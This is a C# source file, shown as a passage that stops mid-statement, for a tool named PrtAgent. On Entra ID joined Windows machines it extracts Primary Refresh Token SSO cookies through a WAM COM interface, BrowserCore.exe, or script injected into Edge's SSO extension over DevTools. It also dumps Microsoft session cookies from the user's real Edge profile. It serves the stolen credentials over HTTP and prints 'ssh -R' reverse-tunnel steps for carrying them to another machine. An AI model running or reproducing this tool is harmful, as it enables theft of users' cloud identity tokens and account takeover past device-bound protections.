using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

// ---------------------------------------------------------------------------
//  WAM / PRT COM interface — IProofOfPossessionCookieInfoManager
//  CLSID: A9927F85-A304-4390-8B23-A75F1C668600  (WindowsTokenProvider)
//  IID:   CDAECE56-4EDF-43DF-B113-88E4556FA1BB
//
//  This is the same COM interface BrowserCore.exe calls internally.
//  Calling it directly means no child process, no NativeMessaging registry
//  lookup, no stdin/stdout pipe — just an in-process COM vtable call that
//  loads aadtb.dll into the current process and asks WAM for the PRT cookie.
// ---------------------------------------------------------------------------
[Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
[ComImport]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IProofOfPossessionCookieInfoManager
{
    int GetCookieInfoForUri(
        [MarshalAs(UnmanagedType.LPWStr)] string Uri,
        out uint cookieInfoCount,
        out IntPtr output);
}

[Guid("A9927F85-A304-4390-8B23-A75F1C668600")]
[ComImport]
class WindowsTokenProvider { }

[StructLayout(LayoutKind.Sequential)]
struct PopCookieInfoNative
{
    public IntPtr Name;
    public IntPtr Data;
    public uint   Flags;
    public IntPtr P3PHeader;
}

// ===========================================================================
//  PrtAgent  —  PRT extractor + HTTP agent for Entra ID joined machines
//
//  Endpoints:
//    GET  /health   → {"status":"ok","browser_core":true|false}
//    POST /extract  body: {"url":"<aad-authorize-url>"}
//                   resp: {"credentials":[{"name":...,"data":...,"domain":...}]}
//    GET  /session  → {"cookies":[...]}  (headless Edge, real profile)
//    GET|POST /kill → {"status":"stopping"}  (shuts down the agent)
//
//  Options:
//    --host <addr>      bind address  (default 127.0.0.1)
//    --port <n>         HTTP port     (default 5555)
//    --cdp-port <n>     CDP port for /session headless Edge (default 19227)
//    --method <m>       extraction method for /extract: com | browsercore | cdp
//                         com         — in-process WAM COM call (no child process)
//                         browsercore — spawn BrowserCore.exe via NativeMessaging
//                         cdp         — evaluate in Edge's built-in SSO extension SW
//                                       (BrowserCore spawns under msedge.exe; requires
//                                        Edge running with --remote-debugging-port)
//                         (if omitted, /extract returns 400)
//    --verbose / -v     extra logging
//
//  NOTE: must run as non-elevated user — elevated token has no PRT.
// ===========================================================================

class Program
{
    static HttpListener _listener;

    // -----------------------------------------------------------------------
    static int Main(string[] args)
    {
        bool   verbose   = HasFlag(args, "--verbose") || HasFlag(args, "-v");
        string host      = GetOption(args, "--host") ?? "127.0.0.1";
        int    p         = 0;
        int    port      = int.TryParse(GetOption(args, "--port"), out p) ? p : 5555;
        int    cdpP           = 0;
        string cdpPortStr      = GetOption(args, "--cdp-port");
        int    cdpPort         = int.TryParse(cdpPortStr, out cdpP) ? cdpP : 19227;
        bool   cdpPortExplicit = (cdpPortStr != null);
        string extractMethod   = GetOption(args, "--method");  // "com" | "browsercore" | null

        return RunAgent(host, port, cdpPort, cdpPortExplicit, extractMethod, verbose);
    }

    // -----------------------------------------------------------------------
    //  Agent (HTTP server) mode
    // -----------------------------------------------------------------------
    static int RunAgent(string host, int port, int cdpPort, bool cdpPortExplicit, string extractMethod, bool verbose)
    {
        // HttpListener requires a trailing slash in the prefix.
        // We bind both 127.0.0.1 and [::1] so that "ssh -R 5555:localhost:5555"
        // works whether the Entra machine resolves localhost to IPv4 or IPv6.
        bool defaultHost = (host == "127.0.0.1");
        string prefix  = string.Format("http://{0}:{1}/", host, port);
        string prefix6 = string.Format("http://[::1]:{0}/", port);

        HttpListener listener = new HttpListener();
        _listener = listener;
        listener.Prefixes.Add(prefix);
        if (defaultHost) listener.Prefixes.Add(prefix6);  // also ::1

        try { listener.Start(); }
        catch (Exception ex)
        {
            Console.Error.WriteLine("[!] Could not start listener on " + prefix);
            Console.Error.WriteLine("    " + ex.Message);
            return 1;
        }

        string displayAddr = defaultHost
            ? string.Format("127.0.0.1:{0}  +  [::1]:{0}", port)
            : string.Format("{0}:{1}", host, port);
        Console.WriteLine(new string('=', 60));
        Console.WriteLine("  PRT Agent  —  http://" + displayAddr + "/");
        Console.WriteLine(new string('=', 60));
        Console.WriteLine();
        Console.WriteLine("  On this (Entra ID) machine:");
        Console.WriteLine("    1. This agent is running on port {0}", port);
        Console.WriteLine("    2. CDP port for /session: {0}", cdpPort);
        Console.WriteLine("    3. Open reverse tunnel:");
        Console.WriteLine("         ssh -R {0}:localhost:{0} user@ssh-server", port);
        Console.WriteLine("         NOTE: '-R {0}' (no colons) does SOCKS — NOT what you want.", port);
        Console.WriteLine();
        Console.WriteLine("  On the normal machine:");
        Console.WriteLine("    1. Forward the port from the SSH server locally:");
        Console.WriteLine("         ssh -L {0}:localhost:{0} user@ssh-server", port);
        Console.WriteLine("    2. Run the sync script:");
        Console.WriteLine("         python normal_sync.py --port {0}", port);
        Console.WriteLine();
        Console.WriteLine("  Press Ctrl-C to stop.");
        Console.WriteLine();

        // Handle Ctrl-C gracefully
        Console.CancelKeyPress += (s, e) =>
        {
            e.Cancel = true;
            Console.WriteLine("\n[agent] shutting down...");
            listener.Stop();
        };

        while (listener.IsListening)
        {
            HttpListenerContext ctx;
            try { ctx = listener.GetContext(); }
            catch (HttpListenerException) { break; }  // listener was stopped
            catch (ObjectDisposedException) { break; }

            // Handle each request on the thread pool so the accept loop is free
            ThreadPool.QueueUserWorkItem(_ => HandleRequest(ctx, cdpPort, cdpPortExplicit, extractMethod, verbose));
        }

        Console.WriteLine("[agent] stopped.");
        return 0;
    }

    static void HandleRequest(HttpListenerContext ctx, int cdpPort, bool cdpPortExplicit, string extractMethod, bool verbose)
    {
        string method = ctx.Request.HttpMethod;
        string path   = ctx.Request.Url.AbsolutePath;

        if (verbose)
            Console.WriteLine("[agent] {0} {1}", method, path);

        try
        {
            if (method == "GET" && path == "/health")
                HandleHealth(ctx);
            else if (method == "GET" && path == "/session")
                HandleSession(ctx, cdpPort, cdpPortExplicit, verbose);
            else if (method == "POST" && path == "/extract")
                HandleExtract(ctx, extractMethod, cdpPort, verbose);
            else if (path == "/kill")   // accept GET or POST — curl POST with no body sends no Content-Length, HttpListener returns 411
                HandleKill(ctx);
            else
                SendJson(ctx.Response, 404, "{\"error\":\"unknown path\"}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("[agent] Unhandled error: " + ex.Message);
            try { SendJson(ctx.Response, 500, "{\"error\":\"internal error\"}"); } catch { }
        }
    }

    static void HandleHealth(HttpListenerContext ctx)
    {
        bool avail = false;
        try
        {
            // Probe COM availability — no-op URI just checks if WAM is reachable.
            var provider = (IProofOfPossessionCookieInfoManager)new WindowsTokenProvider();
            uint   probeCount;
            IntPtr probePtr;
            provider.GetCookieInfoForUri("https://login.microsoftonline.com/",
                out probeCount, out probePtr);
            avail = true;
        }
        catch { }
        SendJson(ctx.Response, 200,
            string.Format("{{\"status\":\"ok\",\"browser_core\":{0}}}",
                avail ? "true" : "false"));
    }

    static void HandleKill(HttpListenerContext ctx)
    {
        Console.WriteLine("[agent] /kill received — shutting down.");
        SendJson(ctx.Response, 200, "{\"status\":\"stopping\"}");
        _listener.Stop();
    }

    //  GET /session — extract live ESTS session cookies from Edge
    // -----------------------------------------------------------------------
    static void HandleSession(HttpListenerContext ctx, int cdpPort, bool cdpPortExplicit, bool verbose)
    {
        bool edgeRunning = Process.GetProcessesByName("msedge").Length > 0;

        if (edgeRunning)
        {
            if (!cdpPortExplicit)
            {
                Console.WriteLine("[session] Edge is running but --cdp-port not specified — skipping session extraction");
                SendJson(ctx.Response, 200, "{\"cookies\":[]}");
                return;
            }
            // Connect to the already-running Edge via CDP
            Console.WriteLine("[agent] /session — connecting to running Edge CDP on port " + cdpPort);
            try
            {
                string result = QueryEdgeCdp(cdpPort, verbose);
                SendJson(ctx.Response, 200, result);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[session] Error: " + ex.Message);
                if (verbose) Console.Error.WriteLine(ex.ToString());
                SendJson(ctx.Response, 500, "{\"error\":" + JsonString(ex.Message) + "}");
            }
            return;
        }

        // Edge is not running — launch headless with the user's real profile
        Console.WriteLine("[agent] /session — launching headless Edge (cdp-port=" + cdpPort + ")");
        string edgePath = FindEdge();
        if (edgePath == null)
        {
            SendJson(ctx.Response, 500, "{\"error\":\"Edge not found\"}");
            return;
        }

        string profileDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Edge", "User Data");

        Process edgeProc = null;
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(edgePath);
            psi.Arguments      = string.Format(
                "--headless=new --remote-debugging-port={0} --user-data-dir=\"{1}\" "
              + "--no-first-run --no-default-browser-check "
              + "--disable-extensions about:blank",
                cdpPort, profileDir);
            psi.UseShellExecute = false;
            psi.CreateNoWindow  = true;
            edgeProc = Process.Start(psi);

            string result = QueryEdgeCdp(cdpPort, verbose);
            SendJson(ctx.Response, 200, result);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("[session] Error: " + ex.Message);
            if (verbose) Console.Error.WriteLine(ex.ToString());
            SendJson(ctx.Response, 500, "{\"error\":" + JsonString(ex.Message) + "}");
        }
        finally
        {
            if (edgeProc != null && !edgeProc.HasExited)
                try { edgeProc.Kill(); } catch { }
        }
    }

    // Poll CDP /json/list, call Network.getAllCookies, return filtered JSON
    static string QueryEdgeCdp(int cdpPort, bool verbose)
    {
        string wsUrl = null;
        for (int attempt = 0; attempt < 40; attempt++)
        {
            Thread.Sleep(500);
            try
            {
                var wc = new WebClient();
                wc.Headers[HttpRequestHeader.UserAgent] = "PrtAgent";
                string list = wc.DownloadString(
                    string.Format("http://127.0.0.1:{0}/json/list", cdpPort));
                int wiStart = list.IndexOf("\"webSocketDebuggerUrl\"");
                if (wiStart >= 0)
                {
                    int q1 = list.IndexOf('"', wiStart + 23);
                    int q2 = list.IndexOf('"', q1 + 1);
                    if (q2 > q1) { wsUrl = list.Substring(q1 + 1, q2 - q1 - 1); break; }
                }
            }
            catch { /* not ready yet */ }
        }

        if (wsUrl == null)
            throw new Exception("Edge CDP did not become ready on port " + cdpPort);
        if (verbose) Console.WriteLine("[session] WS target: " + wsUrl);

        string cdpResp = CdpCall(wsUrl, "Network.getAllCookies", "{}");
        if (verbose) Console.WriteLine("[session] CDP response len=" + cdpResp.Length);

        List<EdgeCookie> all      = ParseGetAllCookies(cdpResp);
        var              filtered = new List<EdgeCookie>();
        foreach (EdgeCookie c in all)
        {
            string d = c.Domain.TrimStart('.');
            if (   d.EndsWith("microsoftonline.com", StringComparison.OrdinalIgnoreCase)
                || d.EndsWith("microsoft.com",      StringComparison.OrdinalIgnoreCase)
                || d.EndsWith("msauth.net",          StringComparison.OrdinalIgnoreCase))
                filtered.Add(c);
        }
        Console.WriteLine(string.Format(
            "[agent] /session — {0} total, {1} auth-domain cookies",
            all.Count, filtered.Count));

        var parts = new List<string>();
        foreach (EdgeCookie c in filtered) parts.Add(c.ToJson());
        return "{\"cookies\":[" + string.Join(",", parts.ToArray()) + "]}";
    }

    // Send one CDP command and return the raw JSON response
    static string CdpCall(string wsUrl, string method, string paramsJson)
    {
        using (var ws = new ClientWebSocket())
        {
            ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None)
              .GetAwaiter().GetResult();

            string msg  = string.Format(
                "{{\"id\":1,\"method\":\"{0}\",\"params\":{1}}}", method, paramsJson);
            byte[] buf  = Encoding.UTF8.GetBytes(msg);
            ws.SendAsync(new ArraySegment<byte>(buf),
                WebSocketMessageType.Text, true, CancellationToken.None)
              .GetAwaiter().GetResult();

            // Receive (may come in multiple chunks)
            var sb   = new StringBuilder();
            var recv = new byte[131072];
            while (true)
            {
                var r = ws.ReceiveAsync(new ArraySegment<byte>(recv), CancellationToken.None)
                          .GetAwaiter().GetResult();
                sb.Append(Encoding.UTF8.GetString(recv, 0, r.Count));
                if (r.EndOfMessage) break;
            }
            ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None)
              .GetAwaiter().GetResult();
            return sb.ToString();
        }
    }

    static List<EdgeCookie> ParseGetAllCookies(string json)
    {
        var list = new List<EdgeCookie>();
        int ci = json.IndexOf("\"cookies\"");
        if (ci < 0) return list;
        int arrOpen = json.IndexOf('[', ci);
        if (arrOpen < 0) return list;

        // Find the matching ]
        int depth = 0, arrClose = -1;
        for (int i = arrOpen; i < json.Length; i++)
        {
            if      (json[i] == '[') depth++;
            else if (json[i] == ']') { if (--depth == 0) { arrClose = i; break; } }
        }
        if (arrClose < 0) return list;

        string arr = json.Substring(arrOpen + 1, arrClose - arrOpen - 1);
        foreach (string obj in SplitJsonObjects(arr))
        {
            string name   = ExtractStringField(obj, "name");
            string value  = ExtractStringField(obj, "value");
            string domain = ExtractStringField(obj, "domain");
            if (string.IsNullOrEmpty(name) || value == null || string.IsNullOrEmpty(domain))
                continue;
            var c = new EdgeCookie
            {
                Name     = name,
                Value    = value,
                Domain   = domain,
                Path     = ExtractStringField(obj, "path") ?? "/",
                Secure   = ExtractBoolField(obj, "secure"),
                HttpOnly = ExtractBoolField(obj, "httpOnly"),
                Expires  = ExtractNumberField(obj, "expires"),
                SameSite = ExtractStringField(obj, "sameSite") ?? "None",
            };
            list.Add(c);
        }
        return list;
    }

    static void HandleExtract(HttpListenerContext ctx, string extractMethod, int cdpPort, bool verbose)
    {
        if (string.IsNullOrEmpty(extractMethod))
        {
            SendJson(ctx.Response, 400,
                "{\"error\":\"--method not specified. Use --method com, browsercore, or cdp\"}");
            return;
        }

        string body;
        using (var sr = new StreamReader(ctx.Request.InputStream, Encoding.UTF8))
            body = sr.ReadToEnd();

        string url = ExtractStringField(body, "url");
        if (string.IsNullOrEmpty(url))
        {
            SendJson(ctx.Response, 400, "{\"error\":\"missing 'url'\"}");
            return;
        }

        Console.WriteLine("[agent] /extract  method=" + extractMethod
            + "  url[:80]=" + (url.Length > 80 ? url.Substring(0, 80) : url));

        List<SsoCookie> creds;
        try
        {
            if (extractMethod == "browsercore")
                creds = CallBrowserCore(url, verbose);
            else if (extractMethod == "com")
                creds = GetCookiesViaCom(url);
            else if (extractMethod == "cdp")
                creds = CallBrowserCoreViaCdp(url, cdpPort, verbose);
            else
            {
                SendJson(ctx.Response, 400,
                    "{\"error\":\"unknown method '" + extractMethod + "'. Use com, browsercore, or cdp\"}");
                return;
            }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("[agent] extract error: " + ex.Message);
            SendJson(ctx.Response, 500, "{\"error\":" + JsonString(ex.Message) + "}");
            return;
        }

        if (creds.Count == 0)
        {
            SendJson(ctx.Response, 500,
                "{\"error\":\"no credentials returned — device may not be Entra joined or process is elevated\"}");
            return;
        }

        if (verbose)
            foreach (SsoCookie c in creds)
                Console.WriteLine("[agent] cred: " + c.Name + "  len=" + c.Data.Length);

        var parts = new List<string>();
        foreach (SsoCookie c in creds) parts.Add(c.ToJson());
        string json = "{\"credentials\":[" + string.Join(",", parts.ToArray()) + "]}";
        Console.WriteLine("[agent] OK — " + creds.Count + " credential(s)");
        SendJson(ctx.Response, 200, json);
    }

    // -----------------------------------------------------------------------
    //  CDP extraction — attaches to Edge's built-in SSO extension via the
    //  browser-level WS endpoint (Target.getTargets + Target.attachToTarget
    //  flat session).  BrowserCore is invoked by the extension context so its
    //  parent process is msedge.exe, not PrtAgent.
    //  Requires Edge running with --remote-debugging-port=<cdpPort>.
    // -----------------------------------------------------------------------
    const string SsoExtId = "ppnbnpeolgkicgegkbkbjmhlideopiji";

    static List<SsoCookie> CallBrowserCoreViaCdp(string uri, int cdpPort, bool verbose)
    {
        // 1. Get the browser-level WS URL from /json/version
        var    wc      = new WebClient();
        wc.Headers[HttpRequestHeader.UserAgent] = "PrtAgent";
        string version = wc.DownloadString(
            string.Format("http://127.0.0.1:{0}/json/version", cdpPort));
        string browserWs = ExtractStringField(version, "webSocketDebuggerUrl");
        if (browserWs == null)
            throw new Exception("Could not get browser WS URL from /json/version on port " + cdpPort);
        if (verbose) Console.WriteLine("[cdp] Browser WS: " + browserWs);

        using (var ws = new ClientWebSocket())
        {
            ws.ConnectAsync(new Uri(browserWs), CancellationToken.None)
              .GetAwaiter().GetResult();

            // 2. Enable target discovery — this wakes dormant MV3 service workers
            //    and fires targetCreated events for all existing targets.
            Send(ws, "{\"id\":0,\"method\":\"Target.setDiscoverTargets\",\"params\":{\"discover\":true}}");
            Thread.Sleep(600);  // let service workers start up

            // 3. List all targets (now includes woken extension service workers)
            Send(ws, "{\"id\":1,\"method\":\"Target.getTargets\",\"params\":{}}");
            string targetsMsg = ReadUntilId(ws, 1, verbose);

            // 3. Collect candidates: exact extension ID URL match first, then any
            //    worker-type target.  Edge often hides the extension URL from CDP
            //    so the anonymous worker must be probed.
            var exactCandidates  = new List<string>();
            var workerCandidates = new List<string>();
            {
                int tiIdx = targetsMsg.IndexOf("\"targetInfos\"");
                if (tiIdx < 0) tiIdx = 0;
                int arrOpen = targetsMsg.IndexOf('[', tiIdx);
                if (arrOpen >= 0)
                {
                    int depth = 0, arrClose = -1;
                    for (int i = arrOpen; i < targetsMsg.Length; i++)
                    {
                        if      (targetsMsg[i] == '[') depth++;
                        else if (targetsMsg[i] == ']') { if (--depth == 0) { arrClose = i; break; } }
                    }
                    if (arrClose > arrOpen)
                    {
                        string arr = targetsMsg.Substring(arrOpen + 1, arrClose - arrOpen - 1);
                        foreach (string obj in SplitJsonObjects(arr))
                        {
                            string turl  = ExtractStringField(obj, "url")      ?? "";
                            string ttype = ExtractStringField(obj, "type")     ?? "";
                            string tid   = ExtractStringField(obj, "targetId") ?? "";
                            if (string.IsNullOrEmpty(tid)) continue;
                            if (turl.IndexOf(SsoExtId, StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                exactCandidates.Add(tid);
                                if (verbose) Console.WriteLine("[cdp] Exact ext match: " + tid + " url=" + turl);
                            }
                            else if (ttype == "worker"          || ttype == "service_worker"
                                  || ttype == "background_page" || ttype == "shared_worker")
                            {
                                workerCandidates.Add(tid);
                                if (verbose) Console.WriteLine("[cdp] Worker candidate: " + tid + " type=" + ttype);
                            }
                        }
                    }
                }
            }

            var candidates = new List<string>(exactCandidates);
            foreach (string c in workerCandidates)
                if (!candidates.Contains(c)) candidates.Add(c);

            if (candidates.Count == 0)
                throw new Exception(
                    "No extension or worker targets found. "
                  + "Is Edge running with --remote-debugging-port=" + cdpPort + "? "
                  + "Targets: " + targetsMsg.Substring(0, Math.Min(2000, targetsMsg.Length)));

            // 4. Attach to each candidate, try connectNative directly, use first that responds
            string sessionId = null;
            string targetId  = null;
            string evalResult = null;
            int    cmdId     = 2;
            foreach (string cid in candidates)
            {
                if (verbose) Console.WriteLine("[cdp] Trying target: " + cid);
                Send(ws, "{\"id\":" + cmdId + ",\"method\":\"Target.attachToTarget\",\"params\":"
                       + "{\"targetId\":" + JsonString(cid) + ",\"flatten\":true}}");
                string attachMsg = ReadUntilId(ws, cmdId, verbose);
                cmdId++;
                string sid = ExtractStringField(attachMsg, "sessionId");
                if (sid == null) { if (verbose) Console.WriteLine("[cdp] Attach failed: " + attachMsg); continue; }
                if (verbose) Console.WriteLine("[cdp] Session: " + sid);

                // Must enable Runtime domain first and wait for ACK before evaluating.
                // Sending Runtime.evaluate without this ACK causes silent drops on worker targets.
                Send(ws, "{\"sessionId\":" + JsonString(sid)
                       + ",\"id\":" + cmdId + ",\"method\":\"Runtime.enable\",\"params\":{}}");
                string enableAck = ReadUntilSession(ws, sid, cmdId, 3000, verbose);
                cmdId++;
                if (enableAck == null)
                {
                    if (verbose) Console.WriteLine("[cdp] Runtime.enable no ACK, skipping.");
                    continue;
                }
                if (verbose) Console.WriteLine("[cdp] Runtime.enable OK, evaluating...");

                // Full connectNative script — awaitPromise, 20 s total wait
                string probeScript =
                      "new Promise(function(resolve,reject){"
                    + "if(typeof chrome==='undefined'||typeof chrome.runtime==='undefined')"
                    +   "{reject('no-chrome-runtime');return;}"
                    + "var p=chrome.runtime.connectNative('com.microsoft.browsercore');"
                    + "var t=setTimeout(function(){p.disconnect();reject('timeout');},15000);"
                    + "p.onMessage.addListener(function(m){clearTimeout(t);p.disconnect();resolve(JSON.stringify(m));});"
                    + "p.onDisconnect.addListener(function(){"
                    +   "clearTimeout(t);"
                    +   "reject(chrome.runtime.lastError?chrome.runtime.lastError.message:'disconnected');"
                    + "});"
                    + "p.postMessage({method:'GetCookies',uri:" + JsonString(uri) + "});"
                    + "})";
                Send(ws, "{\"sessionId\":" + JsonString(sid)
                       + ",\"id\":" + cmdId + ",\"method\":\"Runtime.evaluate\",\"params\":"
                       + "{\"expression\":" + JsonString(probeScript)
                       + ",\"awaitPromise\":true,\"returnByValue\":true}}");
                string probeResp = ReadUntilSession(ws, sid, cmdId, 20000, verbose);
                cmdId++;

                if (probeResp == null)
                {
                    if (verbose) Console.WriteLine("[cdp] No response from target (timeout), skipping.");
                    continue;
                }
                if (probeResp.Contains("\"exceptionDetails\"") || probeResp.Contains("no-chrome-runtime"))
                {
                    if (verbose) Console.WriteLine("[cdp] Target has no chrome.runtime, skipping: "
                        + probeResp.Substring(0, Math.Min(200, probeResp.Length)));
                    continue;
                }
                // Success — this target responded with BrowserCore data
                sessionId  = sid;
                targetId   = cid;
                evalResult = probeResp;
                if (verbose) Console.WriteLine("[cdp] Using target " + cid);
                break;
            }

            if (sessionId == null)
                throw new Exception("No worker target responded to connectNative. "
                    + "Is the Entra SSO extension loaded in this Edge profile?");

            // 5. evalResult already holds the BrowserCore response from the probe
            string result = ExtractStringField(evalResult, "value");
            if (result == null)
                throw new Exception("CDP evaluate returned no value: " + evalResult);

            if (verbose) Console.WriteLine("[cdp] response: " + result);

            try { ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "",
                CancellationToken.None).GetAwaiter().GetResult(); } catch { }
            return ParseBrowserCoreResponse(result);
        }
    }

    // Read WS messages until one contains the top-level "id":<n> field
    static string ReadUntilId(ClientWebSocket ws, int id, bool verbose)
    {
        string m1 = "\"id\":" + id + ",";
        string m2 = "\"id\":" + id + "}";
        string m3 = "\"id\": " + id + ",";
        string m4 = "\"id\": " + id + "}";
        while (true)
        {
            string msg = ReadMessage(ws);
            if (verbose)
                Console.WriteLine("[cdp-raw] " + msg.Substring(0, Math.Min(2000, msg.Length)));
            if (msg.Contains(m1) || msg.Contains(m2)
             || msg.Contains(m3) || msg.Contains(m4))
                return msg;
        }
    }

    // Read WS messages until one contains both the sessionId and the matching id.
    // timeoutMs=0 means no timeout; otherwise returns null on timeout.
    static string ReadUntilSession(ClientWebSocket ws, string sessionId, int id, int timeoutMs, bool verbose)
    {
        string sm = "\"sessionId\":" + JsonString(sessionId);
        string i1 = "\"id\":" + id + ",";
        string i2 = "\"id\":" + id + "}";
        CancellationTokenSource cts = timeoutMs > 0
            ? new CancellationTokenSource(timeoutMs)
            : new CancellationTokenSource();
        try
        {
            while (true)
            {
                string msg = ReadMessage(ws, cts.Token);
                if (msg == null) return null;  // timeout / cancelled
                if (verbose)
                    Console.WriteLine("[cdp-sess] " + msg.Substring(0, Math.Min(300, msg.Length)));
                if (msg.Contains(sm) && (msg.Contains(i1) || msg.Contains(i2)))
                    return msg;
            }
        }
        catch (OperationCanceledException) { return null; }
        finally { cts.Dispose(); }
    }

    static string ReadMessage(ClientWebSocket ws)
    {
        return ReadMessage(ws, CancellationToken.None);
    }

    static string ReadMessage(ClientWebSocket ws, CancellationToken ct)
    {
        var    sb  = new StringBuilder();
        byte[] buf = new byte[262144];
        while (true)
        {
            WebSocketReceiveResult r;
            try
            {
                r = ws.ReceiveAsync(new ArraySegment<byte>(buf), ct).GetAwaiter().GetResult();
            }
            catch (OperationCanceledException) { return null; }
            catch (AggregateException ae)
            {
                if (ae.InnerException is OperationCanceledException) return null;
                throw;
            }
            sb.Append(Encoding.UTF8.GetString(buf, 0, r.Count));
            if (r.EndOfMessage) break;
        }
        return sb.ToString();
    }

    static void Send(ClientWebSocket ws, string msg)
    {
        byte[] buf = Encoding.UTF8.GetBytes(msg);
        ws.SendAsync(new ArraySegment<byte>(buf),
            WebSocketMessageType.Text, true, CancellationToken.None)
          .GetAwaiter().GetResult();
    }

    // -----------------------------------------------------------------------
    //  BrowserCore extraction — spawn BrowserCore.exe, use NativeMessaging protocol
    // -----------------------------------------------------------------------
    static List<SsoCookie> CallBrowserCore(string uri, bool verbose)
    {
        string bcPath = FindBrowserCore();
        if (bcPath == null)
            throw new Exception("BrowserCore.exe not found");
        if (verbose) Console.WriteLine("[browsercore] path: " + bcPath);

        ProcessStartInfo psi = new ProcessStartInfo(bcPath);
        psi.UseShellExecute        = false;
        psi.RedirectStandardInput  = true;
        psi.RedirectStandardOutput = true;
        psi.CreateNoWindow         = true;

        Process proc = Process.Start(psi);
        try
        {
            // NativeMessaging: 4-byte LE length prefix + UTF-8 JSON
            string req     = "{\"method\":\"GetCookies\",\"uri\":" + JsonString(uri) + "}";
            byte[] reqBytes = Encoding.UTF8.GetBytes(req);
            byte[] lenBytes = BitConverter.GetBytes((uint)reqBytes.Length);
            if (!BitConverter.IsLittleEndian) Array.Reverse(lenBytes);

            Stream stdin = proc.StandardInput.BaseStream;
            stdin.Write(lenBytes, 0, 4);
            stdin.Write(reqBytes, 0, reqBytes.Length);
            stdin.Flush();
            stdin.Close();

            // Read response
            Stream stdout = proc.StandardOutput.BaseStream;
            byte[] rlenBytes = ReadExact(stdout, 4);
            if (!BitConverter.IsLittleEndian) Array.Reverse(rlenBytes);
            uint rlen = BitConverter.ToUInt32(rlenBytes, 0);
            byte[] rdata = ReadExact(stdout, (int)rlen);
            string response = Encoding.UTF8.GetString(rdata);

            if (verbose) Console.WriteLine("[browsercore] response: " + response);
            proc.WaitForExit(5000);

            return ParseBrowserCoreResponse(response);
        }
        finally
        {
            if (!proc.HasExited) try { proc.Kill(); } catch { }
        }
    }

    static byte[] ReadExact(Stream s, int count)
    {
        byte[] buf    = new byte[count];
        int    offset = 0;
        while (offset < count)
        {
            int n = s.Read(buf, offset, count - offset);
            if (n == 0) throw new EndOfStreamException("BrowserCore pipe closed early");
            offset += n;
        }
        return buf;
    }

    static List<SsoCookie> ParseBrowserCoreResponse(string json)
    {
        var list = new List<SsoCookie>();

        // Expected shape: {"response":{"Cookies":[{"Name":"...","Data":"..."},...]}}
        // Field names may be camel or Pascal-cased — search for both.
        int cookiesIdx = json.IndexOf("\"Cookies\"", StringComparison.OrdinalIgnoreCase);
        if (cookiesIdx < 0) return list;
        int arrOpen = json.IndexOf('[', cookiesIdx);
        if (arrOpen < 0) return list;

        int depth = 0, arrClose = -1;
        for (int i = arrOpen; i < json.Length; i++)
        {
            if      (json[i] == '[') depth++;
            else if (json[i] == ']') { if (--depth == 0) { arrClose = i; break; } }
        }
        if (arrClose < 0) return list;

        string arr = json.Substring(arrOpen + 1, arrClose - arrOpen - 1);
        foreach (string obj in SplitJsonObjects(arr))
        {
            // Accept Name/name, Data/data
            string name = ExtractStringField(obj, "Name") ?? ExtractStringField(obj, "name");
            string data = ExtractStringField(obj, "Data") ?? ExtractStringField(obj, "data");
            if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(data))
            {
                data = data.Split(new char[]{';'}, 2)[0].Trim();
                list.Add(new SsoCookie { Name = name, Data = data });
            }
        }
        return list;
    }

    static string FindBrowserCore()
    {
        // 1. Search versioned Edge application directories
        string[] bases = {
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        };
        foreach (string b in bases)
        {
            string edgeDir = Path.Combine(b, "Microsoft", "Edge", "Application");
            if (!Directory.Exists(edgeDir)) continue;
            foreach (string verDir in Directory.GetDirectories(edgeDir))
            {
                string bc = Path.Combine(verDir, "BrowserCore", "BrowserCore.exe");
                if (File.Exists(bc)) return bc;
            }
        }
        // 2. Registry: NativeMessaging host manifest for com.microsoft.browsercore
        foreach (string sub in new[]{
            @"SOFTWARE\Google\Chrome\NativeMessagingHosts\com.microsoft.browsercore",
            @"SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.microsoft.browsercore" })
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(sub)
                           ?? Registry.CurrentUser.OpenSubKey(sub);
            if (key == null) continue;
            string manifestPath = key.GetValue(null) as string;
            key.Close();
            if (string.IsNullOrEmpty(manifestPath) || !File.Exists(manifestPath)) continue;
            // The manifest JSON has a "path" field pointing to BrowserCore.exe
            string manifest = File.ReadAllText(manifestPath);
            string bcPath   = ExtractStringField(manifest, "path");
            if (!string.IsNullOrEmpty(bcPath) && File.Exists(bcPath)) return bcPath;
        }
        return null;
    }

    static void SendJson(HttpListenerResponse resp, int statusCode, string json)
    {
        byte[] body = Encoding.UTF8.GetBytes(json);
        resp.StatusCode = statusCode;
        resp.ContentType = "application/json";
        resp.ContentLength64 = body.Length;
        try
        {
            resp.OutputStream.Write(body, 0, body.Length);
            resp.OutputStream.Close();
        }
        catch { /* client disconnected */ }
    }

    // -----------------------------------------------------------------------
    //  WAM / PRT credential retrieval via IProofOfPossessionCookieInfoManager
    //  In-process COM call — no child process, no NativeMessaging registry.
    //  aadtb.dll loads into this process and calls WAM directly.
    // -----------------------------------------------------------------------
    static List<SsoCookie> GetCookiesViaCom(string uri)
    {
        var    list  = new List<SsoCookie>();
        var    mgr   = (IProofOfPossessionCookieInfoManager)new WindowsTokenProvider();
        uint   count;
        IntPtr ptr;
        int    hr    = mgr.GetCookieInfoForUri(uri, out count, out ptr);

        if (hr != 0)
            throw new Exception(string.Format(
                "IProofOfPossessionCookieInfoManager.GetCookieInfoForUri returned 0x{0:X8}. "
